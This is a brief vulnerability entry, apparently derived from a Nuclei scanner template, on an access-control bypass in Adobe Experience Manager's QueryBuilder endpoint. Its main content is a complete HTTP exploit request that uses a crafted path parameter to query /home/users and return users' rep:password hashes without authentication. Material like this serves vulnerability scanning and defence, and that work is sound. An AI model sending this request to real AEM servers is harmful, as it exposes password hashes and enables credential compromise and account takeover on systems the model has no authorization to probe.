# Vulnerability: AEM QueryBuilder JSON Exposure - Bypass
**Classification:** AEM
**Source:** Nuclei Template (`aem-querybuilder-bypass.yaml`)

## Description
Adobe Experience Manager QueryBuilder endpoint allows unauthenticated attackers to extract sensitive user repository data, including password hashes from the rep:password field in /home/users. This vulnerability bypasses access controls and exposes bcrypt/SHA-256 password hashes through the querybuilder.json API, enabling potential credential compromise and account takeover attacks.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /bin/querybuilder.json;x='x/graphql/execute/json/x'?path=%2Fhome%2Fusers&type=rep%3AUser&p.hits=selective&p.properties=rep%3Apassword&p.limit=3 HTTP/1.1
Host: {{Hostname}}
```

